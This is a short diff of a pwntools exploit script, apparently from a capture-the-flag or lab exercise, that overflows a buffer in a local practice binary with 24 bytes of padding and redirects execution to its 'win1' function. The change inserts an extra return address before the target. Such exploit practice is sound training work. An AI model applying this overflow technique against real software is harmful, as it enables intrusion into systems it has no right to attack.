@@ -16,6 +16,6 @@ gdb.attach(p, """
 """)
 
 binary = ELF('./example02')
-p.sendline(b'A' * 24 + p64(binary.symbols['win1']))
+p.sendline(b'A' * 24 + p64(0x0000000000400506) + p64(binary.symbols['win1']))
 
 p.interactive()
